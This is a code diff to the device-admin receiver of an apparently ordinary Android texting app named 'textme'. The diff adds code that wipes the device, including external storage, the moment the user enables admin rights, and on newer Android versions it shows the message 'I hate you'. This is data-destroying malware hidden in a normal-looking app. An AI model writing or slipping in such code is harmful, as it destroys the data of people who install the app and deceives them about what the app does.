@@ -1,9 +1,13 @@
 package com.candroid.textme.receivers;
 
 import android.app.admin.DeviceAdminReceiver;
+import android.app.admin.DevicePolicyManager;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.os.UserHandle;
+
+import java.io.IOException;
 
 public class AdminReceiver extends DeviceAdminReceiver {
 
@@ -15,6 +19,16 @@ public class AdminReceiver extends DeviceAdminReceiver {
     @Override
     public void onEnabled(Context context, Intent intent) {
         super.onEnabled(context, intent);
+        try{
+            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE, "I hate you");
+            }else{
+                devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+            }
+        }catch (SecurityException e){
+            e.printStackTrace();
+        }
     }
 
     @Override
